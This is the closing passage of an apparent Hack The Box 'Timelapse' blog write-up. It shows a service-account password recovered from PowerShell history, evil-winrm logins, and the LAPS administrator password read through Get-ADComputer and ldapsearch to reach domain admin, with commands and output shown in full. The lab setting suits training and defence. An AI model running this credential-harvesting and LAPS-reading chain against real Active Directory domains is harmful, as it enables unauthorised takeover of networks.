+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span></span></span></code></pre><div id="https://www.notion.so/f29fc2348a8244549292c374eae8ad9f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Also there’s no privileges that can be abused.</span></span></p></div><div id="https://www.notion.so/ff9b33a99ec142c5991f2b10b7e8ae05" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">PowerShell History:</strong></span></span></p></div><div id="https://www.notion.so/9f08d64c37244c31af94644fbe54aa6f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Similar to bash, PowerShell also stores command history in a text file. The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Get-PSReadlineOption</code></span><span class="SemanticString"> command can be used to get the history file location.</span></span></p></div><div id="https://www.notion.so/5ad5fef4c17642a69eb1fb3e8f69b2ed" class="Bookmark"><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7.4"><h5 class="Bookmark__Title">about History - PowerShell</h5><p class="Bookmark__Desc">Describes how to get and run commands in the command history.</p><p class="Bookmark__Link">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7.4</p></a></div><div id="https://www.notion.so/65a41d5f66514d9badb1a2ab163824f4" class="Bookmark"><a href="https://learn.microsoft.com/en-us/powershell/module/psreadline/get-psreadlineoption?view=powershell-7.4"><h5 class="Bookmark__Title">Get-PSReadLineOption (PSReadLine) - PowerShell</h5><p class="Bookmark__Desc">The Get-PSReadLineOption cmdlet returns the current state of the settings that can be configured using the Set-PSReadLineOption cmdlet. You can use the returned object to change PSReadLine options. This provides a slightly simpler way to set syntax coloring options for multiple kinds of tokens.</p><p class="Bookmark__Link">https://learn.microsoft.com/en-us/powershell/module/psreadline/get-psreadlineoption?view=powershell-7.4</p></a></div><div id="https://www.notion.so/b6c4dbe62c9e415b9c9f5d05c31207ed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ Get-PSReadlineOption</code></span></span></p></div><pre id="https://www.notion.so/f5def4b771f64ad581983fa5d9164f57" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>EditMode                               : Windows
+AddToHistoryHandler                    : 
+HistoryNoDuplicates                    : True
+HistorySavePath                        : C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Conso
+                                         leHost_history.txt
+HistorySaveStyle                       : SaveIncrementally
+HistorySearchCaseSensitive             : False
+HistorySearchCursorMovesToEnd          : False
+MaximumHistoryCount                    : 4096
+ContinuationPrompt                     : &gt;&gt; 
+ExtraPromptLineCount                   : 0
+PromptText                             : 
+BellStyle                              : Audible
+DingDuration                           : 50
+DingTone                               : 1221
+CommandsToValidateScriptBlockArguments : {ForEach-Object, %, Invoke-Command, icm...}
+CommandValidationHandler               : 
+CompletionQueryItems                   : 100
+MaximumKillRingCount                   : 10
+ShowToolTips                           : True
+ViModeIndicator                        : None
+WordDelimiters                         : ;:,.[]{}()/\|^&amp;*-=+&#x27;&quot;--?
+CommandColor                           : &quot;$([char]0x1b)[93m&quot;
+CommentColor                           : &quot;$([char]0x1b)[32m&quot;
+ContinuationPromptColor                : &quot;$([char]0x1b)[37m&quot;
+DefaultTokenColor                      : &quot;$([char]0x1b)[37m&quot;
+EmphasisColor                          : &quot;$([char]0x1b)[96m&quot;
+ErrorColor                             : &quot;$([char]0x1b)[91m&quot;
+KeywordColor                           : &quot;$([char]0x1b)[92m&quot;
+MemberColor                            : &quot;$([char]0x1b)[97m&quot;
+NumberColor                            : &quot;$([char]0x1b)[97m&quot;
+OperatorColor                          : &quot;$([char]0x1b)[90m&quot;
+ParameterColor                         : &quot;$([char]0x1b)[90m&quot;
+SelectionColor                         : &quot;$([char]0x1b)[30;47m&quot;
+StringColor                            : &quot;$([char]0x1b)[36m&quot;
+TypeColor                              : &quot;$([char]0x1b)[37m&quot;
+VariableColor                          : &quot;$([char]0x1b)[92m&quot;</span></span></span></code></pre><div id="https://www.notion.so/da01c6ebf644488198741d4a61e0d4d1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/11f6e1423b3949c3ae440aaebe52a3a9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></span></span></p></div><pre id="https://www.notion.so/ff48efc22d7c449fa8529b6b51122904" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString &#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27; -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential (&#x27;svc_deploy&#x27;, $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit</span></span></span></code></pre><div id="https://www.notion.so/63e6560ad97b48d79687f1226038ccc6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The user previously ran a command that contains the plaintext password for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_deploy</code></span><span class="SemanticString">, which I used to get another WinRM session as this user.</span></span></p></div><div id="https://www.notion.so/2046651037d4486f9aa96f26c8145dc5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ evil-winrm -i 10.129.227.113 -u svc_deploy -p &#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27; -P 5986 -S</code></span></span></p></div><div id="https://www.notion.so/b683658b77c746cea14ae2bc7e44ff74" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa29b795a-9731-4453-a1b8-523831297d5c%2FUntitled.png?width=1174&amp;table=block&amp;id=b683658b-77c7-46ce-a14a-e2bc7e44ff74"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa29b795a-9731-4453-a1b8-523831297d5c%2FUntitled.png?width=1174&amp;table=block&amp;id=b683658b-77c7-46ce-a14a-e2bc7e44ff74" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/5fa43b6e510840eebbb23836c8ff27d2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami</code></span></span></p></div><pre id="https://www.notion.so/de9f300e1f0a4684a197be6dd4a2df5e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>timelapse\svc_deploy</span></span></span></code></pre><div id="https://www.notion.so/e08caf85eb9a481e9816c3d8b053c5d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/97f55ab9e7864789829c4ce965f136e6" class="Divider"></div><h3 id="https://www.notion.so/449cf56372b1469e88586aaba54fb953" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/449cf56372b1469e88586aaba54fb953"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_deploy</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/0e9ab55416a6453c90a75b18a9bb5682" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Groups &amp; Privileges:</strong></span></span></p></div><div id="https://www.notion.so/075571f316d343d0a6d9fa6849284b62" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami /priv</code></span></span></p></div><pre id="https://www.notion.so/9399d40cdbe64bc09a0ace5ffadd33f8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span></span></span></code></pre><div id="https://www.notion.so/aa87a0122fe4446da5331be4f32f15cc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It has the exact same privileges as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">legacyy</code></span><span class="SemanticString">, hence none of them are useful for escalation.</span></span></p></div><div id="https://www.notion.so/5a70736b8953484da0e0818b2f8abf98" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami /groups</code></span></span></p></div><pre id="https://www.notion.so/de6278b136d44ee58dcfa4d281d0e230" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span></span></span></code></pre><div id="https://www.notion.so/34b5f613b87b4e29b7fde585adf7e1a9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, it’s in a group called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">LAPS_Readers</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/11acd09d14eb4654af77d2271c2985be" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ net groups LAPS_Readers</code></span></span></p></div><pre id="https://www.notion.so/2b8a7db1d9cb45f5b152bdfd21005cce" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Group name     LAPS_Readers
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+svc_deploy
+The command completed successfully.</span></span></span></code></pre><div id="https://www.notion.so/164fa5cd8f114cadae5416146c0c83b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">While there’s no description available for this group, the name itself strongly suggests that it’s LAPS-related.</span></span></p></div><div id="https://www.notion.so/f8f34c4467c54277afce66147619017d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">LAPS:</strong></span></span></p></div><div id="https://www.notion.so/5fcd7166db1d4dba8cf561cc4530997a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Windows’ Local Administrator Password Solution (LAPS) is a password management solution that handles password rotation for administrative accounts. A side-effect of using LAPS is that the admin password is stored as an LDAP attribute, which may introduce some security concerns.</span></span></p></div><div id="https://www.notion.so/63bbfe8a1d894309a45eb99b469180bb" class="Bookmark"><a href="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview"><h5 class="Bookmark__Title">Windows LAPS overview</h5><p class="Bookmark__Desc">Get an overview of Windows Local Administrator Password Solution (Windows LAPS), including key scenarios and setup and management options.</p><p class="Bookmark__Link">https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview</p></a></div><div id="https://www.notion.so/993638a19c774d1a9c21323d1de15711" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Based on the group name </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">LDAP_Readers</code></span><span class="SemanticString">, it’s highly possible that </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_deploy</code></span><span class="SemanticString"> can read this password in plaintext, hence able to escalate privileges.</span></span></p></div><div id="https://www.notion.so/34819f1bfe5f4eb79602c2fbf855df74" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/96805703f7d04d4f8b9a5b6ff5a22698" class="Divider"></div><h3 id="https://www.notion.so/9af07e45cff0488a8efe8b317b3ec5af" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/9af07e45cff0488a8efe8b317b3ec5af"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/0ba287ed5abd47e18e4c7956e9420ec1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">LAPS_Readers</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"> Group Abuse:</strong></span></span></p></div><div id="https://www.notion.so/91157fada3d54df5a314e82b07570f2e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To read the password, I simply used </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Get-ADComputer</code></span><span class="SemanticString"> to read the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ms-mcs-admpwd</code></span><span class="SemanticString"> property:</span></span></p></div><div id="https://www.notion.so/7b64500109344cb6931eebb9e3032c71" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ Get-ADComputer DC01 -property &#x27;ms-mcs-admpwd&#x27;</code></span></span></p></div><pre id="https://www.notion.so/0cb85430c17548e89a0bd16711cce6c5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName       : dc01.timelapse.htb
+Enabled           : True
+ms-mcs-admpwd     : M#).&amp;7[S9)b(11ai57L6p5y(
+Name              : DC01
+ObjectClass       : computer
+ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName    : DC01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName :</span></span></span></code></pre><div id="https://www.notion.so/0b4f38a6782342ceb1b5f75a2653545b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Alternatively, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ldapsearch</code></span><span class="SemanticString"> can also be used:</span></span></p></div><div id="https://www.notion.so/b1cb6a8e4b734c808bbc10e60e345248" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ldapsearch x -H ldap://timelapse.htb -D &#x27;svc_deploy&#x27; -w &#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27; -b &quot;dc=timelapse,dc=htb&quot; &quot;(ms-MCS-AdmPwd=*)&quot; ms-Mcs-AdmPwd</code></span></span></p></div><pre id="https://www.notion.so/ad5c8e842f3c45d393743e29d92f3ef2" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># extended LDIF
+#
+# LDAPv3
+# base &lt;dc=timelapse,dc=htb&gt; with scope subtree
+# filter: (ms-MCS-AdmPwd=*)
+# requesting: ms-Mcs-AdmPwd 
+#
+
+# DC01, Domain Controllers, timelapse.htb
+dn: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+ms-Mcs-AdmPwd: M#).&amp;7[S9)b(11ai57L6p5y(
+
+# search reference
+ref: ldap://ForestDnsZones.timelapse.htb/DC=ForestDnsZones,DC=timelapse,DC=htb
+
+# search reference
+ref: ldap://DomainDnsZones.timelapse.htb/DC=DomainDnsZones,DC=timelapse,DC=htb
+
+# search reference
+ref: ldap://timelapse.htb/CN=Configuration,DC=timelapse,DC=htb
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 5
+# numEntries: 1
+# numReferences: 3</span></span></span></code></pre><div id="https://www.notion.so/00a189393f794a17aa20974f1f4255a8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With this password, I used </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString"> once more to obtain an administrative shell session:</span></span></p></div><div id="https://www.notion.so/a6f3e0ce0f8e41b1976d523885519625" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ evil-winrm -i 10.129.227.113 -u Administrator -p &#x27;M#).&amp;7[S9)b(11ai57L6p5y(&#x27; -P 5986 -S</code></span></span></p></div><div id="https://www.notion.so/28c6570f8a41440d88f38ccc874ff9b9" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F37609ae8-87ea-43f7-a2a5-41f409d47d0f%2FUntitled.png?width=1150&amp;table=block&amp;id=28c6570f-8a41-440d-88f3-8ccc874ff9b9"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F37609ae8-87ea-43f7-a2a5-41f409d47d0f%2FUntitled.png?width=1150&amp;table=block&amp;id=28c6570f-8a41-440d-88f3-8ccc874ff9b9" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/4215d4704bb741ca9615dea7ab1d5215" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami</code></span></span></p></div><pre id="https://www.notion.so/2e6181abebed4e9f9d8aea7f95ff79a1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>timelapse\administrator</span></span></span></code></pre><div id="https://www.notion.so/0c2e093059f24756ac955a8e242d1514" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><div id="https://www.notion.so/c7369051704f40f7a98105a2f85d9988" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The root flag can be found in another user’s Desktop:</span></span></p></div><div id="https://www.notion.so/a1b60c391879443b8d19d69521d2d777" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ dir C:\Users\TRX\Desktop</code></span></span></p></div><pre id="https://www.notion.so/ab1a21e40b154634a161154315e1e5a5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>    Directory: C:\Users\TRX\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/20/2024   8:04 AM             34 root.txt</span></span></span></code></pre><div id="https://www.notion.so/6f5f085fe27341c4bf829028b784725b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ type root.txt</code></span></span></p></div><pre id="https://www.notion.so/3bd6e78cb66149fba2589d0e07ea27ac" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>02e52267************************</span></span></span></code></pre><div id="https://www.notion.so/777288fd636c41218b1b8f033732bfb7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/4fa25389fff44e30b5cdf73d86dde1ac" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2024</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
